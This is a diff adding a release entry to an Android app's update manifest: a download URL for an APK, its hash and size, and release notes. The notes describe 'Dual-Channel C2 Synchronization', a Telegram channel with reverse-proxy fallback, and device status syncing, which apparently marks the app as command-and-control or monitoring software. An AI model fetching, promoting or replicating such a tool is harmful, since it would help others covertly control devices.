@@ -1,5 +1,16 @@
 [
   {
+    "versionCode": 58,
+    "versionName": "3.6.2",
+    "releaseDate": "2026-09-25",
+    "fileName": "pasa-v3.6.2-58.apk",
+    "downloadUrl": "https://pasa.izhaanintellect.fun/releases/pasa-v3.6.2-58.apk",
+    "sha256": "bb4d55edba028d750d565b2039ac1dd41cae814e9c89a49afd156263182073f6",
+    "size": 19079338,
+    "mandatory": false,
+    "releaseNotes": "v3.6.2: Dual-Channel C2 Synchronization & Unblocked Gateway Auto-Fallback — Resolves Telegram connection timeouts with intelligent unblocked reverse proxy fallback, enables real-time device status synchronization, and eliminates font encoding artifacts."
+  },
+  {
     "versionCode": 57,
     "versionName": "3.6.1",
     "releaseDate": "2026-09-25",
